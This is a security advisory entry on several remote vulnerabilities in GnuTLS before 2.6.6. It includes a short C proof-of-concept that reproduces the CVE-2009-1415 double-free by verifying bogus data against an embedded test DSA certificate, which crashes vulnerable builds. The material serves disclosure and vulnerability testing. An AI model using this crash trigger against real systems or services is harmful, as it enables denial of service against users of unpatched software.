source: http://www.securityfocus.com/bid/34783/info

GnuTLS is prone to multiple remote vulnerabilities:

- A remote code-execution vulnerability
- A denial-of-service vulnerability
- A signature-generation vulnerability
- A signature-verification vulnerability

An attacker can exploit these issues to potentially execute arbitrary code, trigger denial-of-service conditions, carry out attacks against data signed with weak signatures, and cause clients to accept expired or invalid certificates from servers.

Versions prior to GnuTLS 2.6.6 are vulnerable. 

/*
 * Small code to reproduce the CVE-2009-1415 double-free problem.
 *
 * Build it using:
 *
 *  gcc -o cve-2009-1415 cve-2009-1415.c -lgnutls
 *
 * If your gnutls library is OK then running it will just print 'success!'.
 *
 * If your gnutls library is buggy, then running it will crash like this:
 *
 * ** glibc detected *** ./cve-2009-1415: munmap_chunk(): invalid pointer: 0xb7f80a9c ***
 * ======= Backtrace: =========
 * ...
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>

#include <gnutls/gnutls.h>

static char dsa_cert[] =
  "-----BEGIN CERTIFICATE-----\n"
  "MIIDbzCCAtqgAwIBAgIERiYdRTALBgkqhkiG9w0BAQUwGTEXMBUGA1UEAxMOR251\n"
  "VExTIHRlc3QgQ0EwHhcNMDcwNDE4MTMyOTQxWhcNMDgwNDE3MTMyOTQxWjA3MRsw\n"
  "GQYDVQQKExJHbnVUTFMgdGVzdCBzZXJ2ZXIxGDAWBgNVBAMTD3Rlc3QuZ251dGxz\n"
  "Lm9yZzCCAbQwggEpBgcqhkjOOAQBMIIBHAKBgLmE9VqBvhoNxYpzjwybL5u2DkvD\n"
  "dBp/ZK2d8yjFoEe8m1dW8ZfVfjcD6fJM9OOLfzCjXS+7oaI3wuo1jx+xX6aiXwHx\n"
  "IzYr5E8vLd2d1TqmOa96UXzSJY6XdM8exXtLdkOBBx8GFLhuWBLhkOI3b9Ib7GjF\n"
  "WOLmMOBqXixjeOwHAhSfVoxIZC/+jap6bZbbBF0W7wilcQKBgGIGfuRcdgi3Rhpd\n"
  "15fUKiH7HzHJ0vT6Odgn0Zv8J12nCqca/FPBL0PCN8iFfz1Mq12BMvsdXh5UERYg\n"
  "xoBa2YybQ/Dda6D0w/KKnDnSHHsP7/ook4/SoSLr3OCKi60oDs/vCYXpNr2LelDV\n"
  "e/clDWxgEcTvcJDP1hvru47GPjqXA4GEAAKBgA+Kh1fy0cLcrN9Liw+Luin34QPk\n"
  "VfqymAfW/RKxgLz1urRQ1H+gDkPnn8l4EV/l5Awsa2qkNdy9VOVgNpox0YpZbmsc\n"
  "ur0uuut8h+/ayN2h66SD5out+vqOW9c3yDI+lsI+9EPafZECD7e8+O+P90EAXpbf\n"
  "DwiW3Oqy6QaCr9Ivo4GTMIGQMAwGA1UdEwEB/wQCMAAwGgYDVR0RBBMwEYIPdGVz\n"
  "dC5nbnV0bHMub3JnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMA8GA1UdDwEB/wQFAwMH\n"
  "gAAwHQYDVR0OBBYEFL/su87Y6HtwVuzz0SuS1tSZClvzMB8GA1UdIwQYMBaAFOk8\n"
  "HPutkm7mBqRWLKLhwFMnyPKVMAsGCSqGSIb3DQEBBQOBgQBCsrnfD1xzh8/Eih1f\n"
  "x+M0lPoX1Re5L2ElHI6DJpHYOBPwf9glwxnet2+avzgUQDUFwUSxOhodpyeaACXD\n"
  "o0gGVpcH8sOBTQ+aTdM37hGkPxoXjtIkR/LgG5nP2H2JRd5TkW8l13JdM4MJFB4W\n"
  "QcDzQ8REwidsfh9uKAluk1c/KQ==\n"
  "-----END CERTIFICATE-----\n";

const gnutls_datum_t dsa_cert_dat = {
  dsa_cert, sizeof (dsa_cert)
};

int
main (void)
{
  gnutls_x509_crt_t crt;
  gnutls_datum_t data = { "foo", 3 };
  gnutls_datum_t sig = { "bar", 3 };
  int ret;

  gnutls_global_init ();

  ret = gnutls_x509_crt_init (&crt);
  if (ret < 0)
    return 1;

  ret = gnutls_x509_crt_import (crt, &dsa_cert_dat, GNUTLS_X509_FMT_PEM);
  if (ret < 0)
    return 1;

  ret = gnutls_x509_crt_verify_data (crt, 0, &data, &sig);
  if (ret < 0)
    return 1;

  printf ("success!\n");

  gnutls_x509_crt_deinit (crt);
  gnutls_global_deinit ();

  return 0;
}